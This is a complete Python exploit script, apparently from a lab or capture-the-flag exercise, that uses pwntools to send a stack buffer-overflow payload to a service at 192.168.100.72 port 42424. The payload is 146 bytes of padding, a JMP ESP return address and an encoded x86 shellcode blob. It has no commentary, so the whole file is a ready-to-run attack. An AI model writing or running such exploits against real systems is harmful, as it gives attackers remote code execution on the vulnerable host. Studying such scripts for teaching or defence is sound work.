#!/usr/bin/python3
from pwn import remote, p32

offset = 146
junk = b"A" * offset

jmpesp = p32(0x080414c3)

shellcode =  b""
shellcode += b"\xfc\xbb\xdf\x91\xaa\xfd\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\xee\x4a\x5d\x1e\x43\x2e\xf1\x8b"
shellcode += b"\x61\x39\x14\xfb\x03\xf4\x57\x6f\x92\xb6\x67"
shellcode += b"\x5d\xa4\xfe\xee\xa4\xcc\xc0\xb9\x33\x4a\xa9"
shellcode += b"\xbb\xbb\x53\x92\x35\x5a\xe3\x82\x15\xcc\x50"
shellcode += b"\xf8\x95\x67\xb7\x33\x19\x25\x5f\xa2\x35\xb9"
shellcode += b"\xf7\x52\x65\x12\x65\xca\xf0\x8f\x3b\x5f\x8a"
shellcode += b"\xb1\x0b\x54\x41\xb1\x6b\x6b\x59\xb2"

payload = junk + jmpesp + shellcode

shell = remote("192.168.100.72", 42424)
shell.sendline(payload)
shell.close()
